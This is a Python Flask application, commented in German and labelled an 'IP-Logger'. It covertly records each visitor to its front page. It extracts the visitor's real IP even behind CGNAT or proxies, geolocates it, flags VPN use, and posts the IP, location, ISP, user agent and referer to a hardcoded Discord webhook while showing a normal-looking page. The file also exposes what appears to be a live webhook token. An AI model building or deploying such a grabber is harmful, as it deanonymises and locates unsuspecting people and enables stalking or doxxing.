from flask import Flask, request, render_template, jsonify
import requests
import os
from datetime import datetime
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)

app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=1)

WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"

def get_real_ip():
    """
    Holt die ECHTE IP – selbst bei Starlink/CGNAT/VPN/Proxy.
    """
    # 1. Cloudflare
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    
    # 2. Starlink-spezifische Header
    if request.headers.get('X-Forwarded-For'):
        ips = request.headers.get('X-Forwarded-For').split(',')
        # Die LETZTE IP ist oft die echte bei Starlink
        return ips[-1].strip()
    
    # 3. X-Real-IP
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    
    # 4. True-Client-IP (von Akamai/CDNs)
    if request.headers.get('True-Client-IP'):
        return request.headers.get('True-Client-IP')
    
    # 5. Fallback
    return request.remote_addr

def get_ip_via_api():
    """
    Holt die IP über eine externe API (als Backup).
    """
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        if response.status_code == 200:
            return response.json().get('ip')
    except:
        pass
    return None

def check_if_vpn(ip):
    """
    Prüft mit ip-api.com, ob die IP ein VPN/Proxy ist.
    """
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,proxy,hosting', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                ist_vpn = data.get('proxy', False) or data.get('hosting', False)
                return ist_vpn, data
    except:
        pass
    return False, None

@app.route('/')
def home():
    # 1. Echte IP ermitteln (mehrere Methoden)
    real_ip = get_real_ip()
    
    # 2. Fallback: Wenn IP aus Headern 192.168.x.x oder 100.64.x.x (CGNAT) ist,
    #    dann versuche API-Abfrage
    if real_ip.startswith('192.168.') or real_ip.startswith('100.64.') or real_ip.startswith('10.'):
        api_ip = get_ip_via_api()
        if api_ip:
            real_ip = api_ip
    
    # 3. Weitere Header sammeln
    user_agent = request.headers.get('User-Agent', 'Unbekannt')
    referer = request.headers.get("Referer", "Kein Referer")
    accept_language = request.headers.get('Accept-Language', 'Unbekannt')
    
    # 4. VPN-Prüfung
    ist_vpn, geo_data = check_if_vpn(real_ip)
    
    # 5. Discord Embed erstellen
    embed = {
        "embeds": [{
            "title": "🕵️ Neue IP erfasst!",
            "color": 0xFF0000 if ist_vpn else 0x00FF00,
            "fields": [
                {
                    "name": "🌐 IP-Adresse",
                    "value": f"`{real_ip}`",
                    "inline": False
                },
                {
                    "name": "🔒 VPN/Proxy",
                    "value": "✅ **JA**" if ist_vpn else "❌ NEIN",
                    "inline": True
                },
                {
                    "name": "🌍 Standort",
                    "value": f"{geo_data.get('country', 'Unbekannt')} / {geo_data.get('regionName', '')} / {geo_data.get('city', '')}" if geo_data else "Unbekannt",
                    "inline": True
                },
                {
                    "name": "🏢 ISP",
                    "value": geo_data.get('isp', 'Unbekannt') if geo_data else "Unbekannt",
                    "inline": True
                },
                {
                    "name": "🖥️ User-Agent",
                    "value": f"```{user_agent[:150]}```",
                    "inline": False
                },
                {
                    "name": "🔗 Referer",
                    "value": referer[:100],
                    "inline": False
                },
                {
                    "name": "⏰ Zeit",
                    "value": datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
                    "inline": True
                }
            ],
            "footer": {
                "text": "IP-Logger by Render | Starlink-kompatibel"
            }
        }]
    }
    
    # 6. An Discord senden
    try:
        r = requests.post(WEBHOOK_URL, json=embed, timeout=10)
        print(f"[{datetime.now()}] Webhook Status: {r.status_code} - IP: {real_ip}")
    except Exception as e:
        print(f"[{datetime.now()}] Error: {str(e)}")
    
    # 7. Index.html anzeigen
    return render_template("index.html")

@app.route('/api/ip')
def get_ip_json():
    """
    JSON-API für JavaScript-Abfragen (für Starlink-Fallback)
    """
    real_ip = get_real_ip()
    return jsonify({"ip": real_ip})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
